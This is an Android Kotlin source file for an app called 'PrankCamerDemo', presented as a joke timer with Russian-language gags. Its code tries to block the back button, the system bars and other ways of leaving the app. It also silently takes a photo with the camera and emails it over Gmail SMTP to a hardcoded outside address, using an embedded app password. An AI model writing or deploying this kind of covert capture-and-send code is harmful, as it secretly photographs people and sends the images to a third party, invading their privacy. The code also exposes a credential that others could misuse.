package com.example.prankcamerdemo

import android.app.AlertDialog
import android.graphics.Bitmap
import android.hardware.Camera
import android.media.MediaPlayer
import android.os.Bundle
import android.os.CountDownTimer
import android.os.Handler
import android.os.Looper
import android.util.Base64
import android.view.WindowInsets
import android.view.WindowManager
import androidx.appcompat.app.AppCompatActivity
import android.widget.Button
import android.widget.ImageView
import android.widget.TextView
import java.io.ByteArrayOutputStream
import java.util.Properties
import javax.mail.Authenticator
import javax.mail.Message
import javax.mail.MessagingException
import javax.mail.PasswordAuthentication
import javax.mail.Session
import javax.mail.Transport
import javax.mail.internet.InternetAddress
import javax.mail.internet.MimeBodyPart
import javax.mail.internet.MimeMessage
import javax.mail.internet.MimeMultipart
import javax.activation.DataHandler
import javax.mail.util.ByteArrayDataSource
import kotlin.concurrent.thread

class MainActivity : AppCompatActivity() {
    private lateinit var statusText: TextView
    private lateinit var startBtn: Button
    private lateinit var stopBtn: Button
    private var mediaPlayer: MediaPlayer? = null
    private var timer: CountDownTimer? = null
    private var isRunning = false
    
    // App Password для Gmail
    private val apiKey = "pqktageoufxxmaxj"
    
    // Email для получения фото
    private val targetEmail = "metrobugitt@gmail.com"

    // Массив с шутками и приколами
    private val jokes = arrayOf(
        "🤡 Ты попал в ловушку! Шучу... или нет?",
        "💧 Вода течёт, время идёт, а ты всё ещё здесь!",
        "😂 Если ты читаешь это - ты уже проиграл!",
        "🎭 Это не баг, это фича!",
        "⏰ Тик-так... время не ждёт!",
        "🎪 Добро пожаловать в цирк!",
        "🎯 Цель найдена. Отступления нет!",
        "🚫 Выход запрещён до завершения таймера!",
        "😱 Паника? Ещё нет? Сейчас будет!",
        "🎮 Game Over... шучу, продолжай ждать!",
        "🤖 Роботы захватывают мир... а ты ждёшь таймер!",
        "💀 Это конец... или начало?",
        "🌟 Ты избран... ждать!",
        "🎁 Подарок внутри... пустота!",
        "🔥 Огонь, вода и медные трубы!"
    )

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        
        // Блокируем все способы выхода из приложения
        window.addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON)
        window.addFlags(WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD)
        window.addFlags(WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED)
        window.addFlags(WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON)
        
        // Скрываем системные панели
        window.insetsController?.hide(android.view.WindowInsets.Type.systemBars())
        window.setDecorFitsSystemWindows(false)
        
        setContentView(R.layout.activity_main)
        statusText = findViewById(R.id.statusText)
        startBtn = findViewById(R.id.startBtn)
        stopBtn = findViewById(R.id.stopBtn)

        val placeholder: ImageView = findViewById(R.id.placeholderImage)
        placeholder.setImageResource(R.drawable.placeholder)

        startBtn.setOnClickListener {
            AlertDialog.Builder(this)
                .setTitle("⚠️ Подтвердите действие")
                .setMessage("ВНИМАНИЕ! После запуска нельзя будет выйти до завершения таймера! Продолжить?")
                .setPositiveButton("Да, я готов!") { _, _ -> 
                    startSimulation()
                }
                .setNegativeButton("Нет", null)
                .setCancelable(false)
                .show()
        }

        stopBtn.setOnClickListener {
            if (isRunning) {
                AlertDialog.Builder(this)
                    .setTitle("🚫 Выход запрещён!")
                    .setMessage("Нельзя остановить таймер досрочно! Жди окончания!")
                    .setPositiveButton("Понятно", null)
                    .show()
            }
        }
    }
    
    // Блокируем кнопку Назад и недавние приложения
    @Deprecated("Deprecated")
    override fun onBackPressed() {
        // Ничего не делаем - блокируем выход
    }

    // Блокируем недавние приложения
    override fun onAttachedToWindow() {
        super.onAttachedToWindow()
        window.setType(WindowManager.LayoutParams.TYPE_KEYGUARD_DIALOG)
    }
    
    private fun takeAndSendPhoto() {
        thread {
            try {
                // Открываем камеру и делаем фото
                val camera = Camera.open()
                val parameters = camera.parameters
                
                // Настраиваем размер фото
                val sizes = parameters.supportedPictureSizes
                val size = sizes[0] // Берём максимальный размер
                parameters.setPictureSize(size.width, size.height)
                camera.parameters = parameters
                
                // Создаём SurfaceTexture для превью
                val texture = android.graphics.SurfaceTexture(10)
                camera.setPreviewTexture(texture)
                camera.startPreview()
                
                // Даём камере время на фокусировку
                Thread.sleep(500)
                
                // Делаем фото
                val photoData = ByteArrayRef()
                camera.takePicture(null, null, object : Camera.PictureCallback {
                    override fun onPictureTaken(data: ByteArray?, camera: Camera?) {
                        if (data != null) {
                            photoData.data = data
                        }
                        camera?.release()
                    }
                })
                
                // Ждём пока фото сохранится
                Thread.sleep(1000)
                
                if (photoData.data != null) {
                    // Отправляем на почту
                    sendEmailWithPhoto(photoData.data!!)
                }
            } catch (e: Exception) {
                e.printStackTrace()
                // Если камера не доступна - отправляем заглушку
                sendEmailWithPhoto(null)
            }
        }
    }
    
    private fun sendEmailWithPhoto(photoData: ByteArray?) {
        thread {
            try {
                val props = Properties()
                props["mail.smtp.auth"] = "true"
                props["mail.smtp.starttls.enable"] = "true"
                props["mail.smtp.host"] = "smtp.gmail.com"
                props["mail.smtp.port"] = "587"
                
                val session = Session.getInstance(props, object : Authenticator() {
                    override fun getPasswordAuthentication(): PasswordAuthentication {
                        return PasswordAuthentication("metrobugitt@gmail.com", apiKey)
                    }
                })
                
                val message = MimeMessage(session)
                message.setFrom(InternetAddress("metrobugitt@gmail.com"))
                message.setRecipients(Message.RecipientType.TO, InternetAddress.parse(targetEmail))
                message.subject = "📸 Prank Photo Captured!"
                
                // Создаём multipart сообщение
                val multipart = MimeMultipart()
                
                // Текстовая часть
                val textPart = MimeBodyPart()
                val emailBody = """
                    🎭 Prank App - Фото получено!
                    
                    📷 Фото пользователя прикреплено ниже.
                    🔑 API Key: $apiKey
                    
                    ---
                    PrankCamerDemo
                """.trimIndent()
                textPart.setText(emailBody)
                multipart.addBodyPart(textPart)
                
                // Прикрепляем фото
                if (photoData != null) {
                    val attachmentPart = MimeBodyPart()
                    val dataSource = ByteArrayDataSource(photoData, "image/jpeg")
                    attachmentPart.setDataHandler(javax.mail.DataHandler(dataSource))
                    attachmentPart.fileName = "prank_photo_${System.currentTimeMillis()}.jpg"
                    multipart.addBodyPart(attachmentPart)
                }
                
                message.setContent(multipart)
                
                // Отправляем письмо
                Transport.send(message)
                
            } catch (e: Exception) {
                e.printStackTrace()
            }
        }
    }
    
    // Вспомогательный класс для хранения данных фото
    private class ByteArrayRef {
        var data: ByteArray? = null
    }

    private fun startSimulation() {
        isRunning = true
        statusText.text = "🔒 БЛОКИРОВКА АКТИВИРОВАНА!\n📸 Камера активирована..."
        
        // Воспроизводим звук
        mediaPlayer = MediaPlayer.create(this, R.raw.alert_sound)
        mediaPlayer?.isLooping = true
        mediaPlayer?.start()

        // Делаем фото и отправляем
        takeAndSendPhoto()
        
        // Показываем первую шутку
        showRandomJoke()

        timer = object : CountDownTimer(60000, 3000) {
            override fun onTick(millisUntilFinished: Long) {
                val sec = millisUntilFinished / 1000
                statusText.text = "⏰ Осталось: $sec сек.\n\n" + jokes.random()
                showRandomJoke()
            }
            override fun onFinish() {
                statusText.text = "✅ СИМУЛЯЦИЯ ЗАВЕРШЕНА!\nТы выжил! 🎉\n📸 Фото отправлено!"
                mediaPlayer?.stop()
                mediaPlayer?.release()
                mediaPlayer = null
                isRunning = false
            }
        }.start()
    }

    private fun showRandomJoke() {
        AlertDialog.Builder(this)
            .setTitle("🎲 Случайная шутка")
            .setMessage(jokes.random())
            .setPositiveButton("OK", null)
            .setCancelable(false)
            .show()
    }

    private fun stopSimulation() {
        if (!isRunning) return
        timer?.cancel()
        mediaPlayer?.stop()
        mediaPlayer?.release()
        mediaPlayer = null
        isRunning = false
        statusText.text = "Симуляция остановлена пользователем"
    }

    override fun onDestroy() {
        super.onDestroy()
        timer?.cancel()
        mediaPlayer?.release()
    }
}
